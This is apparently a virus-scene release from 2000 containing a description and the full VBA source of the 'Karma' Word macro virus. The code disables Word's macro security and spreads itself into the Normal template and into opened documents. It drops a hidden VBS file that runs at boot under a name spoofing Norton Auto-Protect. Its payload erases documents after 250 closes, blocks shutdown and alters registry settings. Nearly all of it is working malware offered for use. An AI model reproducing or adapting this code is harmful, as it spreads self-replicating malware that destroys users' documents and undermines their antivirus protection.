
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[KARMA.TXT]ÄÄÄ
Karma Word Macro Virus

Version(s) 	v1.00

Type :		Class Virus W97/2000 with VBS backup/Payload	

Number of Macros :	2

AutoOpen	:	Contains the replicating, security and backup code.
AutoClose	:	Contains the counter and payload.

Virus Description : 	The Karma virus first checks to see if the active
document is called Document1. If it is then it dosent infect. This prevents
the virus from trying to infect when word is run without a document. When an
document is run the virus sets all of the Word virus protection/Security
settings to their lowest. It then exports its macro code to C:\Windows\Karma.drv
and sets this file as hidden. It then imports this code to the Normal Template
and Active Document. Next the virus drops a VBS file  "C:\Windows\Backup.vbs"
and sets it as a hidden file. The VBS file is run on boot up of the PC by
using the same registry line as Norton 2000 AV Auto-Protect thus disabling
anti-virus protection on the PC should Norton be installed. All of the above
happens on Auto Open.

When the infected document is closed the virus creates a counter in the Win.ini
file. This counter is document specific. Therefore every infected document opened
and closed in word on the users PC has its own counter in win.ini. The counters
name contains the documents directory also to ensure that the counter is
document specific. Next the virus checks to see if the value of the counter is
greater than 250. if it is then the contents of the document are erased and
over written by the message "This Document has expired due to Bad Karma". This
message is in "Space Woozies" font of size 100 and in bold. Finally the virus
checks to see if the document has been saved and if not saves it. All of the
above happens on Auto Close.

When the PC is rebooted, Backup.vbs is run automatically and quietly in the
background. It sets the virus protection and save normal prompt to false
(Should the user have reset them to true). Then it reinfects the normal
template, whether or not the virus has been removed, this is VBS backup of
the macros. Next the VBS file creates a shortcut in the Favourites folder
pointing to the WalruS home page. Next the VBS file checks to see if the
minute now is 30 and if so displays the following message box "Microsoft
Windows Shutdown Error", "Bad Karma" and sets the computer so that it cannot
be shutdown. The shutdown icon in the Start menu disappears as does the option
to shutdown in Ctrl-Alt-Delete. If the minute now is not equal 30 then this
payload is removed. This makes the shutdown error seem like an intermittent
problem with Windows. Finally the VBS file sets the computers registered
username to "The WalruS"

The WalruS 09/00

e-mail WalruS@z.com	For comments/questions or bugs etc!	
Home Page 		http://www.walrus.8k.com/
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[KARMA.TXT]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[KARMA.CLS]ÄÄÄ
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Sub Document_Open()
On Error Resume Next
' The Karma Virus v1.00 with VBS Backup/Payload
' By WalruS 09/00
 
    If ActiveDocument.Name = "Document1" Then Exit Sub
    
    Set Nor = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set Doc = ActiveDocument.VBProject.VBComponents(1).CodeModule

    With Options
        .VirusProtection = False
        .ConfirmConversions = False
        .SaveNormalPrompt = False
    End With

    Application.DisplayStatusBar = False

    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Norton Auto-Protect") = "C:\Windows\Backup.vbs"

    Open "C:\Windows\Karma.drv" For Output As #1
    Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 85)
    Close #1
    SetAttr ("C:\Windows\Karma.drv"), 6

    Nor.DeleteLines 1, Nor.CountOfLines: Nor.AddFromFile ("C:\Windows\Karma.drv")
    Doc.DeleteLines 1, Doc.CountOfLines: Doc.AddFromFile ("C:\Windows\Karma.drv")

    Open "C:\Windows\Backup.vbs" For Output As #1
        Print #1, "' Backup.vbs for Karma by The WalruS"
        Print #1, "On Error Resume Next"
        Print #1, "Dim WSHShell"
        Print #1, "Dim Shortcut, Fave"
        Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
        Print #1, "Set Backup = WScript.CreateObject(""Word.Application"")"
        Print #1, "Backup.Options.VirusProtection = False"
        Print #1, "Backup.Options.SaveNormalPrompt = False"
        Print #1, "For x = 1 To Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
        Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
        Print #1, "Next"
        Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (""C:\Windows\Karma.drv"")"
        Print #1, "Backup.Application.Quit"
        Print #1, "Fave = (""C:\Windows\Favorites"")"
        Print #1, "Set Shortcut = WSHShell.CreateShortcut(Fave & ""\The WalruS.url"")"
        Print #1, "Shortcut.TargetPath = WSHShell.ExpandEnvironmentStrings(""www.WalruS.8k.com"")"
        Print #1, "Shortcut.Save"
        Print #1, "WSHShell.RegWrite ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner"", ""The WalruS"""
        Print #1, "If Minute(Now) = 30 Then"
        Print #1, "WSHShell.RegWrite ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose"", ""1"""
        Print #1, "MsgBox ""Microsoft Windows Shutdown Error"", vbExclamation, ""Bad Karma"""
        Print #1, "Else"
        Print #1, "WSHShell.RegWrite ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose"", ""WalruS"""
        Print #1, "End If"
    Close #1
    SetAttr ("C:\Windows\Backup.vbs"), 6
    
End Sub

Private Sub Document_Close()
    On Error Resume Next
    sFileName = Environ("Windir")
    If Right(sFileName, 1) <> "\" Then
    sFileName = sFileName & "\"
    End If
    
    sFileName = sFileName & "WIN.INI"

    sCounter = System.PrivateProfileString(sFileName, ActiveDocument.FullName, "Counter")
    sCounter = Val(sCounter) + 1
    System.PrivateProfileString(sFileName, ActiveDocument.FullName, "Counter") = sCounter
    If Val(sCounter) > "250" Then
        Selection.WholeStory
        Selection.Delete Unit:=wdCharacter, Count:=1
        Set myRange = ActiveDocument.Paragraphs(1).Range
            With myRange.Font
                .Bold = True
                .Name = "Space Woozies"
                .Size = 100
            End With
        Selection.TypeText "This Document has expired due to Bad Karma"
    End If
    If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[KARMA.CLS]ÄÄÄ
